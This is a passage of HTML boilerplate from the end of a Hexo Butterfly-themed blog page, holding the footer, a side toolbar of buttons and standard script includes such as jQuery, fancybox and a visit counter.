href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">木叶飞舞之处，火亦生生不息</div><div class="icp"><a><span></span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>